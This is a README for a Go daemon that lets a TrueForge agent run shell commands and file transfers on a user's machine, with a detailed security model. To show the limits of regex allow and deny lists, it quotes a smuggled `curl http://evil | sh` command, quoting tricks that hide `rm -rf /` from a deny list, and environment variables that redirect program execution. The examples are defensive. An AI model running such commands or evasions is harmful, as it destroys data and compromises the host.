# trueforge-computer

A small Go daemon that connects a machine you own to TrueForge. Once it is running, an agent
attached to this computer runs its shell commands and file transfers here instead of in a
disposable sandbox.

The daemon dials out over a WebSocket, so the machine needs **no inbound port, no tunnel and
no public address**. It works behind NAT.

Read the security model below before you point one of these at a machine that matters.

## Install

Download the binary for your platform from the release page and put it on the path:

```sh
curl -fsSLO https://github.com/truefoundry/trueforge/releases/latest/download/trueforge-computer_linux_amd64
curl -fsSLO https://github.com/truefoundry/trueforge/releases/latest/download/SHA256SUMS
sha256sum --check --ignore-missing SHA256SUMS
install -m 0755 trueforge-computer_linux_amd64 /usr/local/bin/trueforge-computer
```

Artifacts are named `trueforge-computer_<os>_<arch>` with os in `linux`, `darwin` and arch in
`amd64`, `arm64`, beside a `SHA256SUMS` covering all four. The server's `/install.sh`
one-liner fetches the same names and verifies the same file.

Builds are static, with no runtime to install: `linux/amd64`, `linux/arm64`, `darwin/amd64`
and `darwin/arm64`. Windows is not supported.

To build from this repository instead:

```sh
pnpm --filter @truefoundry/trueforge-computer build       # all four targets into bin/
pnpm --filter @truefoundry/trueforge-computer build:local # just this machine
```

Go does not need to be installed: the scripts use a `golang` container when there is no local
toolchain, and the local one when there is.

## Enroll, then run

In TrueForge, open **Settings → Computers**, add a computer, and copy the enrollment code. It
is single use and expires after fifteen minutes.

```sh
export TRUEFORGE_URL=https://trueforge.example.com
export TRUEFORGE_ENROLL_CODE=<code>
trueforge-computer enroll
trueforge-computer run
```

The code goes in the environment rather than in `--code` because a flag is visible in `ps`.
`trueforge-computer enroll --url … --code-stdin` reading from a pipe works too.

`enroll` exchanges the code for a long-lived machine credential, writes it to
`<state-dir>/credential` at mode `0600`, and records the server URL and computer id in
`<state-dir>/config.json`. `run` reads both and connects. The computer appears online in the
UI within a second or two.

`run` also accepts `--url` and `--code` directly, and enrolls itself if it has no credential
yet. That is what makes the container command below survive a restart: a code that has already
been spent is ignored rather than presented again.

### Docker

```sh
docker run -d --restart unless-stopped \
  --name trueforge-computer \
  -e TRUEFORGE_URL=https://trueforge.example.com \
  -e TRUEFORGE_ENROLL_CODE=<code> \
  -v trueforge-computer:/var/lib/trueforge-computer \
  ghcr.io/truefoundry/trueforge-computer
```

The entrypoint is `trueforge-computer run`, so any extra arguments are `run`'s. The first
start enrols and serves; a restart finds the credential in the volume and skips straight to
serving, so leaving the now spent code in place does no harm. `--url` and `--code` work as
arguments too, but then the code is visible in `ps` on the host for as long as the container
runs; in the environment it is at least confined to `docker inspect`.

The image is busybox-based, because `exec` needs a shell. It runs as uid 1000, keeps its state
in the named volume, and carries a CA bundle — without one the client cannot verify the
server's certificate and retries forever, which looks like a network fault and is not.

For a read-only root filesystem, give it a writable `/tmp`:

```sh
docker run -d --restart unless-stopped \
  --read-only --tmpfs /tmp \
  --cap-drop ALL --security-opt no-new-privileges \
  -e TRUEFORGE_URL=https://trueforge.example.com \
  -e TRUEFORGE_ENROLL_CODE=<code> \
  -v trueforge-computer:/var/lib/trueforge-computer \
  ghcr.io/truefoundry/trueforge-computer
```

A container reports `python3: false` and `git: false` unless you add them, so TrueForge will
not mount skills on it.

### systemd

`install-service` arrives with Phase 8d. Until then, install the unit yourself. A working
example is committed at [`packaging/trueforge-computer.service`](packaging/trueforge-computer.service):

```sh
sudo useradd --system --create-home --shell /usr/sbin/nologin trueforge
sudo install -m 0644 packaging/trueforge-computer.service /etc/systemd/system/

# The code is read from a pipe, so it never appears in ps or in the unit file.
printf '%s' '<code>' | sudo -u trueforge trueforge-computer enroll \
  --state-dir /var/lib/trueforge-computer \
  --url https://trueforge.example.com --code-stdin

sudo systemctl enable --now trueforge-computer
journalctl -u trueforge-computer -f
```

For an unattended install, put `TRUEFORGE_URL` (and, for the first boot only,
`TRUEFORGE_ENROLL_CODE`) in a `0600` file owned by root and point the unit at it with
`EnvironmentFile=/etc/trueforge-computer.env`; delete the code from that file once the
computer is online.

The unit sets `KillMode=control-group` on purpose. Without it, stopping the service signals the
daemon only, and the commands it started stay running, reparented to PID 1, with nobody to
collect them.

## Commands

| Command                   | What it does                                                                |
| ------------------------- | --------------------------------------------------------------------------- |
| `enroll --url … --code …` | Exchanges the code for a credential and writes the config                   |
| `run`                     | Connects and serves requests until stopped                                  |
| `status`                  | Prints what is on disk and what this machine can do. Local only, no network |
| `version`                 | Prints the version                                                          |
| `install-service`         | Phase 8d. Prints how to install the unit above and exits 4                  |

### Flags

`enroll`:

| Flag           | Default                  | Meaning                                      |
| -------------- | ------------------------ | -------------------------------------------- |
| `--url`        | `$TRUEFORGE_URL`         | Base URL of the TrueForge server             |
| `--code`       | `$TRUEFORGE_ENROLL_CODE` | The single-use enrollment code. See the note |
| `--code-stdin` | off                      | Read the code from standard input instead    |
| `--name`       | the machine's own        | Hostname to report instead of this machine's |
| `--state-dir`  | see below                | Where the credential and config are kept     |
| `--log-format` | `text`                   | `text` or `json`                             |

`run`:

| Flag                 | Default                  | Meaning                                                              |
| -------------------- | ------------------------ | -------------------------------------------------------------------- |
| `--url`              | the enrolled one         | Overrides the stored server URL                                      |
| `--code`             | `$TRUEFORGE_ENROLL_CODE` | Enrolls first if there is no credential yet                          |
| `--code-stdin`       | off                      | Read the code from standard input instead                            |
| `--name`             | the enrolled one         | Hostname to report                                                   |
| `--state-dir`        | see below                | Credential, config, audit log and process-group records              |
| `--workdir`          | `<state-dir>/sessions`   | Root for the per-session directories                                 |
| `--allow-root`       | off                      | Run as root anyway                                                   |
| `--read-only`        | off                      | Refuse every `exec` and every write                                  |
| `--workdir-only`     | off                      | Refuse file operations outside `--workdir`                           |
| `--allow <regex>`    | none                     | A command must match one of these **in full**. Repeatable            |
| `--deny <regex>`     | none                     | A command must match none of these. Repeatable, checked before allow |
| `--allow-env <name>` | none                     | Let the server set this variable on a constrained computer           |
| `--max-concurrent`   | `4`                      | Commands running at once                                             |
| `--max-queue`        | `32`                     | Commands allowed to wait for a slot                                  |
| `--max-exec-seconds` | `1800`                   | Longest deadline this computer honours for one command               |
| `--max-file-bytes`   | `268435456`              | Largest file it will send or receive                                 |
| `--audit-max-bytes`  | `8388608`                | Size at which the audit log rotates                                  |
| `--audit-keep`       | `3`                      | Rotated audit logs to keep                                           |
| `--log-format`       | `json`                   | `json` or `text`                                                     |

`status` also takes `--state-dir` and `--json`.

### Environment and the state directory

`TRUEFORGE_URL`, `TRUEFORGE_ENROLL_CODE` and `TRUEFORGE_STATE_DIR` are the defaults for
`--url`, `--code` and `--state-dir`. A flag always wins.

**Prefer the environment variable or `--code-stdin` to `--code`.** A flag is visible to every
other user on the machine through `ps`, and in a container through `docker inspect`. The
daemon clears `TRUEFORGE_ENROLL_CODE` from its own environment once the code is spent, so no
command it later runs can read it back.

### Plaintext is refused

`http://` and `ws://` are accepted only for `localhost`, `127.0.0.0/8` and `::1`. Anywhere
else they would put the enrollment code, and then the machine credential, on the wire in the
clear, and the daemon refuses to start rather than do that. There is no flag to override it.
The enrollment call also refuses to follow redirects, because a 307 re-sends the body — and
with it the single-use code — to wherever it was pointed.

The state directory is `$TRUEFORGE_STATE_DIR` if set, otherwise `~/.trueforge`, otherwise
`/var/lib/trueforge-computer`. The image sets the variable, so a container uses the last one.
It is created at mode `0700` and holds:

```
config.json        the server URL, computer id and reported hostname
credential         the machine credential, mode 0600
audit.jsonl        one JSON line per operation
running/           one record per live command group, swept at the next start
sessions/          the per-session working directories
```

## Security model

The short version: **an agent attached to this computer can run any command the daemon's user
can run.** Everything below narrows that; nothing removes it.

**The run-as user is the boundary.** Everything else on this list narrows what a careless
server asks for; none of it contains a determined one. Size the account accordingly.

- **Run as a dedicated unprivileged user.** The daemon refuses to start as root unless you
  pass `--allow-root`. Give the account only what you are willing to let an agent reach — in
  particular, not the owner's SSH keys or cloud credentials.
- **Commands get a built environment**, not an inherited one: `PATH`, `HOME`, `LANG`, `TERM`,
  plus whatever the request carries. The machine credential is never in it, so no command can
  read it back out of its own environment.
- **`--read-only`** refuses `exec` and every write while still allowing reads. Useful for a
  machine you want an agent to look at but not touch.
- **`--workdir-only`** confines file transfers to the working directory. Paths are resolved
  through symlinks before they are compared, and again just before the file is moved into
  place, so a symlink planted inside the directory is not a way out. It does not confine
  `exec`: a shell can `cd` anywhere the user can.
- **The state directory is never reachable**, in any mode, except through `sessions/`. It
  holds the credential, the config that decides where the next start connects, and the
  records the next sweep kills by. A command running as the same user can of course still
  read it — which is the argument for that user being the daemon's own.
- **Uploads are written to a temporary file and moved into place** only after their digest
  agrees, so a failed or abandoned transfer cannot truncate or delete a file that was
  already there, and only regular files are ever read or written.
- **All of this is enforced here, on the machine.** A compromised or hostile server cannot
  lift any of it by asking; the limits live in the flags you started the daemon with.
- **Everything is audited locally.** `audit.jsonl` records every operation with its outcome,
  exit code and byte counts, at mode `0600`, rotating at `--audit-max-bytes`. Environment
  values are never written to it — but the **command line is**, so a secret passed inline on
  a command reaches the disk. Pass secrets through the environment instead.
- **Revocation is immediate.** Revoking the computer in TrueForge closes the live socket. The
  daemon treats that as final: it logs one line and exits 3 rather than retrying.

### What allow and deny lists are, and are not

`--allow` and `--deny` are RE2 regular expressions over the command string. They are a way to
stop a server from asking for something obviously wrong. **They are not a sandbox.**

- **`--allow` patterns must match the whole command.** `git status` does not permit
  `git status; curl http://evil | sh`. A pattern ending in `.*` gives that back, so write the
  narrowest pattern that does the job.
- **`--deny` patterns are tried against the whole command and against each of its lines**, so
  a rule written for one command is not sidestepped by putting the command on line two. Deny
  is checked before allow, and always wins.
- **Quoting defeats a deny list.** `r''m -rf /` and `$(printf rm) -rf /` are the same command
  to the shell and a different string to the regex. Treat deny as a speed bump.
- **An allowed interpreter is a blank cheque.** If `python3 .*` or `git .*` is on the allow
  list, the agent can run anything. Allow lists earn their keep only for simple, fixed
  commands.
- **Environment variables that name a program are refused** once any allow or deny list is
  set: `PATH`, `BASH_ENV`, `ENV`, `IFS`, `SHELLOPTS`, `PS4`, `PROMPT_COMMAND`, `GIT_SSH`,
  `GIT_SSH_COMMAND`, `GIT_EXTERNAL_DIFF`, `GIT_PAGER`, `GIT_EDITOR`, `GIT_ASKPASS`,
  `GIT_EXEC_PATH`, `GIT_PROXY_COMMAND`, `GIT_CONFIG*`, `PAGER`, `EDITOR`, `VISUAL`,
  `PYTHONSTARTUP`, `PYTHONPATH`, `PYTHONHOME`, `NODE_OPTIONS`, `PERL5OPT` and `RUBYOPT`.
  Otherwise an allow list of `git .*` plus a `GIT_SSH_COMMAND` runs whatever it names. The
  whole request is refused rather than the variable quietly dropped; `--allow-env NAME`
  permits one. `LD_*` and `DYLD_*` are refused always and cannot be allowed, because the
  dynamic linker acts on them before anything here could check.

What TrueForge cannot control from here: what the machine can reach on your network, and what
an agent does with the files the daemon's user can read. Those are yours.

### At-least-once delivery

A reply is written back on the socket the request arrived on. If that socket has closed, the
reply is dropped rather than sent on the next one, because the server could not match it; the
drop is recorded in the audit log as `reply_dropped`, which means the work was done and its
outcome is unknown to the server. The server may reissue the request after a reconnect, so
**an operation can run twice**. Commands should be written with that in mind.

File uploads are safe against this. Chunks may arrive in any order — the relay pipelines a
window of them and each is handled on its own goroutine — so a chunk ahead of its turn waits
for its predecessor, and a chunk the transfer has already taken is answered without being
written again. When the socket drops, open uploads are discarded along with their temporary
files, and the server restarts the transfer from chunk zero.

A command, by contrast, is **not** cancelled by a disconnect. It keeps running, and a cancel
arriving on the next socket still reaches it. That is deliberate: a relay restart in the
middle of a ten-minute build should not throw the build away.

## Troubleshooting

### Exit codes

| Code | Meaning                                                                  |
| ---- | ------------------------------------------------------------------------ |
| `0`  | Stopped cleanly                                                          |
| `1`  | Failed. The last log line says why                                       |
| `2`  | Bad flags, not enrolled, or refusing to run as root                      |
| `3`  | The machine credential was revoked. Re-enroll; the daemon will not retry |
| `4`  | Not ready: `status` on an unenrolled machine, or `install-service`       |

### Close codes in the log

| Code   | Meaning                       | What the daemon does                                                                                                    |
| ------ | ----------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| `4401` | Revoked                       | Logs one line and exits 3. It never reconnects                                                                          |
| `4408` | The server stopped hearing us | Reconnects with the usual backoff                                                                                       |
| `4409` | Another connection took over  | Waits at least five minutes. Two daemons sharing one credential would otherwise evict each other forever — run only one |

### Common problems

**`x509: certificate signed by unknown authority`, forever.** The container has no CA bundle.
Use the published image, or copy `/etc/ssl/certs/ca-certificates.crt` into yours.

**The computer shows offline but the daemon is running.** A suspended laptop leaves the socket
open with nothing arriving. The daemon pings every ten seconds and closes a socket that misses
two answers; the server notices within about 25 seconds and the daemon reconnects.

**A command comes back with exit 124.** It hit its deadline and the whole process group was
killed. Raise the timeout on the TrueForge side.

**A command comes back with exit 137 or 143.** It was killed: 137 by a cancel or a shutdown,
143 by a `SIGTERM` it sent itself. Signalled commands report 128 plus the signal number.

**Output ends with `[... N bytes dropped ...]`.** Output is capped at 1 MiB across both
streams. The head and the tail are both kept, so a failure at the end of a build is still
visible; the middle is what goes.

**`status` shows `left behind N command group(s)`.** The daemon was killed while commands were
running and they outlived it. The next `run` kills them before accepting anything new — but
only the ones it can positively identify, by matching the kernel's recorded start time for
the process group leader. A record it cannot confirm is logged and dropped rather than acted
on, because a pid is recycled within hours and the group under it may now be something of
yours. On systemd, `KillMode=control-group` prevents the situation in the first place.

**A command comes back `denied` naming an environment variable.** The server asked to set
something that names a program to run, on a computer with an allow or deny list. Either
narrow what the server sends or permit it explicitly with `--allow-env NAME`. `LD_*` and
`DYLD_*` cannot be permitted.

**`refusing to send credentials over plaintext`.** The URL is `http://` to something that is
not this machine. Use `https://`.

**`enrollment code was refused`.** Codes are single use and last fifteen minutes. Issue a new
one. If you are re-running a container that already enrolled, drop `--code` — the stored
credential is what it needs.

## Developing

```sh
pnpm --filter @truefoundry/trueforge-computer check     # go vet, gofmt -l, go test ./...
pnpm --filter @truefoundry/trueforge-computer test:race # needs cgo, so it is its own script
pnpm --filter @truefoundry/trueforge-computer fmt
```

Go does not have to be installed: each script uses the local toolchain when there is one and
a `golang` container otherwise. The race detector needs cgo, which the release build
deliberately does not use, so it is a separate script rather than a flag on `test`; CI runs
it alongside `check`.

`testdata/protocol` and `testdata/enroll` hold the wire fixtures. They are the shared reference
for the server's schemas, so a change to either side should fail a test on both.
